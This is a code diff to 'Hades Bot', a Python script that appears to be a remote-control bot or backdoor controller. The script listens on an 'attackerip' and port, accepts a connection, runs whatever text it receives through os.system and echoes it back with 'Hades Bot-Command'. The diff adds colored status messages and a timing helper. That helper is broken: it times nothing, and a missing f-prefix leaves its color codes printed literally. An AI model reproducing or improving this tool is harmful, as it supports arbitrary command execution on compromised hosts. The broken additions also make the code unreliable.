@@ -1,4 +1,6 @@
 import socket, readline, os, subprocess,argparse,multiprocessing,platform,sys,time
+from timeit import default_timer as timer
+from datetime import timedelta
 from colorama import Fore,init
 from colorama import Back as bg
 from multiprocessing import Process
@@ -36,7 +38,8 @@ class Controller(object):
             print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]Starting Listener...")
             time.sleep(1)
             print(f"Listening as {server_ip}:{server_port}...")
-            client_socket, client_address = s.accept()
+            global client_socket,client_address
+            client_socket,client_address = s.accept()
             print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}][{client_address[0]}:{client_address[1]} Connected!")
             time.sleep(1.5)
             print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]You may now proceed executing commands in the controller.")
@@ -57,12 +60,19 @@ class Controller(object):
                     cmd_read = client_socket.recv(buffer_size).decode()
                     print(host_format,end='')
                     airbitrary_cmd_exec = os.system(cmd_read)
-                    bot_command = client_socket.send(bytes("Hades Bot-Command:",'utf-8')  + cmd_read.encode())
+                    bot_command = client_socket.send(bytes(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]Hades Bot-Command: ",'utf-8') + cmd_read.encode())
 
         except Exception as Err:
             print(Err)
             print('\nUsage for help: python3 <hades-bot.py> -h ')
 
+    @staticmethod
+    def time_elapsed():
+        start = timer()
+        end = timer()
+        counter = lambda start_time,end_time : timedelta(seconds=end_time-start_time)
+        
+        print("{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]Time Elapsed: " + str(counter(start,end)) + "s")
 
 if __name__ == "__main__":
     main_class = Controller(args.attackerip,args.port)
@@ -92,7 +102,10 @@ if __name__ == "__main__":
                 -.........-
     ''',)) 
     listener = Process(target=main_class.listen)
+    time_elapsed = Process(target=main_class.time_elapsed)
     banner.start()
     banner.join()
     listener.start()
     listener.join()
+    time_elapsed.start()
+    time_elapsed.join()
